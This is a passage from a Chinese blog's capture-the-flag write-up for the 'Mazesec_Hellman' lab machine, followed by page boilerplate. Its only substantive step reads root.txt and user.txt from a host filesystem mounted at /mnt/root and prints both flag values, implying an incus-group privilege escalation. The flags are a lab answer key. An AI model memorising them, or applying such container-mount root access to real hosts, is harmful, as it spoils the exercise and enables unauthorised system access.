+<h1 id="六、查看FALG"><a href="#六、查看FALG" class="headerlink" title="六、查看FALG"></a>六、查看FALG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ <span class="hljs-comment"># cd /mnt/root</span><br>/mnt/root <span class="hljs-comment"># cat root/root.txt home/god/user.txt </span><br>flag&#123;root-da3397afd8ca24ea5bcaf7a2cb83b422&#125;<br>flag&#123;user-c9461249ea2e074a338b82db919b3fb9&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Maze-sec/" class="category-chain-item">Maze-sec</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B1%87%E7%BC%96/" class="print-no-link">#汇编</a>
+      
+        <a href="/tags/Diffie-Hellman/" class="print-no-link">#Diffie-Hellman</a>
+      
+        <a href="/tags/XOR/" class="print-no-link">#XOR</a>
+      
+        <a href="/tags/%E6%8F%90%E5%8F%96-incus%E7%BB%84/" class="print-no-link">#提取-incus组</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Mazesec_Hellman</div>
+      <div>http://miao-sec.github.io/Maze-sec/Mazesec-Hellman/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Miao</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年1月27日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY-MIAO
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/Vulnyx/Vlx_Mux/" title="Vlx_Mux">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Vlx_Mux</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Maze-sec/Mazesec-Happiness/" title="Mazesec_Happiness">
+                        <span class="hidden-mobile">Mazesec_Happiness</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         次
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/scrollAnimation.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
